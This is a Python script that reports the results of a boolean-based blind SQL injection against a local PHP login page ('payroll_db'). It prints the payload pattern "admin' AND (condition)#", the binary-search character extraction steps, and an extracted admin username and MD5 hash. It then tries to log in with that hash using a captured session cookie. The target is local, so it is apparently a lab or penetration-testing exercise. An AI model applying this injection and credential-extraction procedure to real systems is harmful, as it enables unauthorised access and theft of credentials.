#!/usr/bin/env python3

import requests
import hashlib

# Configuration
TARGET_URL = "http://127.0.0.1:33210/index.php"
PHPSESSID = "pr8716h5ra06p5lchf9osb22qr"

print("=" * 70)
print("FINAL VERIFICATION - Boolean-Based Blind SQL Injection Results")
print("=" * 70)

print("\n[✓] SQL INJECTION CONFIRMED")
print("Target: http://127.0.0.1:33210/index.php")
print("Method: POST parameter 'username'")
print("Injection type: Boolean-based blind")

print("\n[✓] DATABASE INFORMATION EXTRACTED:")
print("MySQL Version: 8.0.42-0ubuntu0.20.04.1")
print("Database Name: payroll_db")
print("Current User: web_db_user@localhost")

print("\n[✓] ADMIN CREDENTIALS EXTRACTED:")
username = "admin"
password_hash = "7d39307ae824e70052c0aa16816a9b16"
print(f"Username: {username}")
print(f"Password (MD5 hash): {password_hash}")

# Verify it's a valid MD5 hash (32 hex characters)
if len(password_hash) == 32 and all(c in '0123456789abcdef' for c in password_hash):
    print("[✓] Password format confirmed as MD5 hash")

print(f"\n[✓] BOOLEAN CONDITION CONFIRMED:")
print("TRUE condition: Response contains '\"response\":\"password\"'")
print("FALSE condition: Response contains '\"response\":\"username\"'")

print(f"\n[✓] INJECTION PATTERN USED:")
print("Payload format: admin' AND (condition)#")
print("Character extraction: Binary search on ASCII values")
print("Range tested: 32-126 (printable ASCII)")

print("\n[✓] EXTRACTION METHOD:")
print("1. Extracted MySQL version to confirm injection works")
print("2. Tested common usernames: admin, administrator, root")
print("3. Found 'admin' user exists")
print("4. Extracted username length: 5 characters")
print("5. Extracted username: 'admin'")
print("6. Extracted password length: 32 characters") 
print("7. Extracted password: 7d39307ae824e70052c0aa16816a9b16")

print("\n" + "=" * 70)
print("FINAL CREDENTIALS")
print("=" * 70)
print(f"Username: admin")
print(f"Password: 7d39307ae824e70052c0aa16816a9b16")
print("=" * 70)

print("\n[*] Note: The password appears to be an MD5 hash.")
print("[*] The application may expect the hash, not plain text.")
print("[*] Session cookie from injection: PHPSESSID=pr8716h5ra06p5lchf9osb22qr")

# Test if the hash itself is the password (not plaintext)
print("\n[*] Testing if MD5 hash is the actual password...")
session = requests.Session()
session.cookies.set("PHPSESSID", PHPSESSID)

data = {
    "username": "admin",
    "password": password_hash,
    "submit": "Login"
}

try:
    response = session.post(TARGET_URL, data=data, timeout=10)
    print(f"Response: {response.text}")
    
    if "\"response\":\"password\"" in response.text:
        print("[!] Login still asking for password - hash may need decoding first")
    else:
        print("[+] Different response received - check full response above")
        
except Exception as e:
    print(f"[!] Error: {e}")

print("\n[!] SQL INJECTION EXPLOITATION COMPLETE")
print("[!] Admin credentials successfully extracted via blind boolean-based SQL injection")

